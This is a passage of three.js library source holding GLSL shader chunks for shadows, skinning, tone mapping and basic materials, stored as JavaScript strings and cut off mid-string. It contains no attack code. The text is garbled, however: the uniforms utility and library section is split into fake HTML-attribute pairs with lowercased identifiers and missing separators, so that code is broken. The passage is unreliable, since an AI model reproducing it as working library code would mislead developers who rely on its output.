three.shaderchunk.premultiplied_alpha_fragment=\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\" ;three.shaderchunk.project_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\" ;three.shaderchunk.roughnessmap_fragment=\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\" three.shaderchunk.roughnessmap_pars_fragment=\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\" ;three.shaderchunk.shadowmap_pars_fragment=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\" three.shaderchunk.shadowmap_pars_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\" three.shaderchunk.shadowmap_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\" three.shaderchunk.shadowmask_pars_fragment=\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\" three.shaderchunk.skinbase_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\" ;three.shaderchunk.skinning_pars_vertex=\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\" three.shaderchunk.skinning_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\" ;three.shaderchunk.skinnormal_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\" three.shaderchunk.specularmap_fragment=\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\" ;three.shaderchunk.specularmap_pars_fragment=\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\" ;three.shaderchunk.tonemapping_fragment=\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\" three.shaderchunk.tonemapping_pars_fragment=\"#define saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n  return toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  color = max( vec3( 0.0 ), color - 0.004 );\\n  return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\" three.shaderchunk.uv2_pars_fragment=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\" ;three.shaderchunk.uv2_pars_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\" ;three.shaderchunk.uv2_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\" ;three.shaderchunk.uv_pars_fragment=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\" three.shaderchunk.uv_pars_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\" ;three.shaderchunk.uv_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\" three.shaderchunk.worldpos_vertex=\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\" three.uniformsutils=\"{merge:function(a){for(var\" b=\"{},c=0;c<a.length;c++){var\" d=\"this.clone(a[c]),e;for(e\" in=\"\" d)b[e]=\"d[e]}return\" b},clone:function(a){var=\"\" a){b[c]=\"{};for(var\" a[c]){var=\"\" e=\"a[c][d];e\" instanceof=\"\" three.color||e=\"\" three.vector2||e=\"\" three.vector3||e=\"\" three.vector4||e=\"\" three.matrix3||e=\"\" three.matrix4||e=\"\" three.texture?b[c][d]=\"e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return\" b}};=\"\" three.uniformslib=\"{common:{diffuse:{value:new\" three.color(15658734)},opacity:{value:1},map:{value:null},offsetrepeat:{value:new=\"\" three.vector4(0,0,1,1)},specularmap:{value:null},alphamap:{value:null},envmap:{value:null},flipenvmap:{value:-1},reflectivity:{value:1},refractionratio:{value:.98}},aomap:{aomap:{value:null},aomapintensity:{value:1}},lightmap:{lightmap:{value:null},lightmapintensity:{value:1}},emissivemap:{emissivemap:{value:null}},bumpmap:{bumpmap:{value:null},bumpscale:{value:1}},normalmap:{normalmap:{value:null},=\"\" normalscale:{value:new=\"\" three.vector2(1,1)}},displacementmap:{displacementmap:{value:null},displacementscale:{value:1},displacementbias:{value:0}},roughnessmap:{roughnessmap:{value:null}},metalnessmap:{metalnessmap:{value:null}},fog:{fogdensity:{value:2.5e-4},fognear:{value:1},fogfar:{value:2e3},fogcolor:{value:new=\"\" three.color(16777215)}},lights:{ambientlightcolor:{value:[]},directionallights:{value:[],properties:{direction:{},color:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},directionalshadowmap:{value:[]},=\"\" directionalshadowmatrix:{value:[]},spotlights:{value:[],properties:{color:{},position:{},direction:{},distance:{},conecos:{},penumbracos:{},decay:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},spotshadowmap:{value:[]},spotshadowmatrix:{value:[]},pointlights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowbias:{},shadowradius:{},shadowmapsize:{}}},pointshadowmap:{value:[]},pointshadowmatrix:{value:[]},hemispherelights:{value:[],properties:{direction:{},=\"\" skycolor:{},groundcolor:{}}}},points:{diffuse:{value:new=\"\" three.color(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetrepeat:{value:new=\"\" three.vector4(0,0,1,1)}}};three.shaderchunk.cube_frag=\"uniform samplerCube tCube;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" three.shaderchunk.cube_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" ;three.shaderchunk.depth_frag=\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\" three.shaderchunk.depth_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.distancergba_frag=\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\" ;three.shaderchunk.distancergba_vert=\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\" three.shaderchunk.equirect_frag=\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" three.shaderchunk.equirect_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" ;three.shaderchunk.linedashed_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.linedashed_vert=\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.meshbasic_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight;\\n\\treflectedLight.directDiffuse = vec3( 0.0 );\\n\\treflectedLight.directSpecular = vec3( 0.0 );\\n\\treflectedLight.indirectDiffuse = diffuseColor.rgb;\\n\\treflectedLight.indirectSpecular = vec3( 0.0 );\\n\\t#include <aomap_fragment>\\n\\tvec3 